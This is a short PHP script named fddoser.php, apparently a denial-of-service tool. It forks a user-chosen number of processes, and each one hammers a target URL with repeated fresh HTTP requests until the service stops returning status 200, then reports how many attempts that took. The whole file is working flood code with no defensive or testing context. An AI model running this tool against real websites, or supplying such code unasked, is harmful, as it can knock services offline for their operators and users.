<?php
if (!isset($argv[3]))
	die('Usage: fddoser.php <forks> <repeats> <url>'.PHP_EOL);
$childsCnt = $argv[1];
$iters = $argv[2];
$url = $argv[3];
$childs = [];
$tout = microtime(true);
for($i=0;$i<$childsCnt;$i++) {
	$pid = pcntl_fork();
	if ($pid == -1) {
	     die('could not fork');
	} else if ($pid) {
	     // we are the parent
		$childs[$pid] = true;
		echo "Parent: start PID $pid\n";
	} else {
		
		//echo "I am child ".getmypid().PHP_EOL;
	     break;
	}
}
if ($pid) {
	//print_r($childs);
	echo PHP_EOL;
	foreach($childs as $_p=>$_v) {
		pcntl_waitpid($_p,$status);
	}
	echo PHP_EOL;
	die('All pid finished with '.(microtime(true)-$tout)." seconds".PHP_EOL);
}
for($i=0;$i<$iters;$i++) {
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
	curl_setopt($curl, CURLOPT_URL, $url); 
	curl_setopt($curl, CURLOPT_USERAGENT, 'FDDoser');
	curl_setopt($curl, CURLOPT_FRESH_CONNECT, true);
	curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 31);
	curl_exec($curl);
	$status = curl_getinfo($curl,CURLINFO_HTTP_CODE);
	curl_close($curl);
	if ($status != 200) {
		die('Service returns code: '.$status.' after '.(int)$i.' attempts; PID '.getmypid().' terminate'.PHP_EOL);
	} else {
		//echo getmypid()."\t$i\tOK\n";
	}
	
}
die('PID '.getmypid().' finished after '.(microtime(true)-$tout).' seconds with success result'.PHP_EOL);
